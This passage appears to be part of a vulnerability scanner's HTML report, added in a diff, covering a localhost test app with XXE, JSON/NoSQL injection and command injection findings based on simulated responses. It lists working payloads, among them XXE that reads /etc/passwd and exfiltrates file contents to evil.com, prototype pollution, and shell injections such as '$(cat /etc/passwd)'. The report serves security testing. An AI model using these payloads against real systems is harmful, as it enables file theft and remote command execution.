+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-xml</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>XML Body</div>
+                <div class="label">Payload:</div><div><?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo></div>
+                <div class="label">CWE ID:</div><div>CWE-611</div>
+                <div class="label">Impact:</div><div>XML Injection can lead to disclosure of confidential data, server-side request forgery, denial of service, and in some cases, remote code execution. It can allow attackers to access resources that should not be publicly available.</div>
+                <div class="label">Remediation:</div><div>Disable XML external entity (XXE) processing. Use less complex data formats like JSON if possible. Validate and sanitize all XML input. Patch or upgrade XML parsers. Implement whitelisting for XML content.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains file content that should not be accessible</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>XmlInjection vulnerability found in XML Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-xml</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>XML Body</div>
+                <div class="label">Payload:</div><div><?xml version="1.0"?><!DOCTYPE foo [<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&ac;</foo></div>
+                <div class="label">CWE ID:</div><div>CWE-611</div>
+                <div class="label">Impact:</div><div>XML Injection can lead to disclosure of confidential data, server-side request forgery, denial of service, and in some cases, remote code execution. It can allow attackers to access resources that should not be publicly available.</div>
+                <div class="label">Remediation:</div><div>Disable XML external entity (XXE) processing. Use less complex data formats like JSON if possible. Validate and sanitize all XML input. Patch or upgrade XML parsers. Implement whitelisting for XML content.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains file content that should not be accessible</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>XmlInjection vulnerability found in XML Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-xml</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>XML Body</div>
+                <div class="label">Payload:</div><div><?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]></div>
+                <div class="label">CWE ID:</div><div>CWE-611</div>
+                <div class="label">Impact:</div><div>XML Injection can lead to disclosure of confidential data, server-side request forgery, denial of service, and in some cases, remote code execution. It can allow attackers to access resources that should not be publicly available.</div>
+                <div class="label">Remediation:</div><div>Disable XML external entity (XXE) processing. Use less complex data formats like JSON if possible. Validate and sanitize all XML input. Patch or upgrade XML parsers. Implement whitelisting for XML content.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains file content that should not be accessible</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>XmlInjection vulnerability found in XML Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-xml</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>XML Body</div>
+                <div class="label">Payload:</div><div><?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>">%eval;%exfil;]></div>
+                <div class="label">CWE ID:</div><div>CWE-611</div>
+                <div class="label">Impact:</div><div>XML Injection can lead to disclosure of confidential data, server-side request forgery, denial of service, and in some cases, remote code execution. It can allow attackers to access resources that should not be publicly available.</div>
+                <div class="label">Remediation:</div><div>Disable XML external entity (XXE) processing. Use less complex data formats like JSON if possible. Validate and sanitize all XML input. Patch or upgrade XML parsers. Implement whitelisting for XML content.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains file content that should not be accessible</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>XmlInjection vulnerability found in XML Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-xml</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>XML Body</div>
+                <div class="label">Payload:</div><div><?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo></foo></div>
+                <div class="label">CWE ID:</div><div>CWE-611</div>
+                <div class="label">Impact:</div><div>XML Injection can lead to disclosure of confidential data, server-side request forgery, denial of service, and in some cases, remote code execution. It can allow attackers to access resources that should not be publicly available.</div>
+                <div class="label">Remediation:</div><div>Disable XML external entity (XXE) processing. Use less complex data formats like JSON if possible. Validate and sanitize all XML input. Patch or upgrade XML parsers. Implement whitelisting for XML content.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains file content that should not be accessible</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>XmlInjection vulnerability found in XML Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-xml</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>XML Body</div>
+                <div class="label">Payload:</div><div><?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]></div>
+                <div class="label">CWE ID:</div><div>CWE-611</div>
+                <div class="label">Impact:</div><div>XML Injection can lead to disclosure of confidential data, server-side request forgery, denial of service, and in some cases, remote code execution. It can allow attackers to access resources that should not be publicly available.</div>
+                <div class="label">Remediation:</div><div>Disable XML external entity (XXE) processing. Use less complex data formats like JSON if possible. Validate and sanitize all XML input. Patch or upgrade XML parsers. Implement whitelisting for XML content.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains file content that should not be accessible</div>
+            </div>
+        </div>
+        <h2>JsonInjection Vulnerabilities (17)</h2>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>"}", {"malicious": "payload</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"__proto__": {"polluted": true}}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"constructor": {"prototype": {"polluted": true}}}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"user": "admin", "role": "administrator"}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"$where": "this.a == 1"}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"$gt": ""}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"": {"$ne": null}}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"$regex": "^a"}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"user": {"$exists": true}}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"user": {"$nin": ["user1", "user2"]}}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"": {"$where": "sleep(5000)"}}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"$ne": 1}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"username": {"$regex": "admin", "$options": "i"}}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"username": "admin", "password": {"$ne": ""}}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"username": {"$in": ["admin", "root", "superuser"]}}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"__proto__": {"isAdmin": true}}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>JsonInjection vulnerability found in JSON Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-json</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>JSON Body</div>
+                <div class="label">Payload:</div><div>{"constructor": {"prototype": {"isAdmin": true}}}</div>
+                <div class="label">CWE ID:</div><div>CWE-20</div>
+                <div class="label">Impact:</div><div>JSON Injection can lead to data manipulation, bypassing of authentication, privilege escalation, and in some cases, denial of service. It can also enable prototype pollution in JavaScript applications and NoSQL injection in document databases.</div>
+                <div class="label">Remediation:</div><div>Validate the structure and data types of JSON input. Implement JSON schema validation. Use safe deserialization libraries and keep them updated. For MongoDB or NoSQL databases, use parameterized queries or sanitize inputs. Implement proper access controls and input sanitization.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response indicates successful JSON injection</div>
+            </div>
+        </div>
+        <h2>CommandInjection Vulnerabilities (27)</h2>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>; ls -la</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>& dir</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>| cat /etc/passwd</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>`cat /etc/passwd`</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>$(cat /etc/passwd)</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>; ping -c 5 evil.com</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>& ping -n 5 evil.com</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
